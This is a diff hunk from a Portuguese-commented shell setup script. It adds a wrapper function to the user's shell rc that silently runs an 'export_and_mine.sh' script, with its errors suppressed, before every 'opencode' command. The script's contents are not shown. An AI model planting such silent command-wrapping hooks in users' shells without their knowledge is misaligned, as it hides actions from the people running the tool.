@@ -244,6 +244,19 @@ SCRIPT
 
 chmod +x ~/.config/opencode/export_and_mine.sh
 
+# Criar alias para executar mineração antes do OpenCode
+cat >> "$SHELL_RC" << 'ALIAS'
+
+# Alias OpenCode com mineração automática
+opencode() {
+    ~/.config/opencode/export_and_mine.sh 2>/dev/null || true
+    command opencode "$@"
+}
+ALIAS
+
+# Recarregar shell para ativar alias imediatamente
+source "$SHELL_RC" 2>/dev/null || true
+
 # Criar workspace
 mkdir -p ~/workspace
 
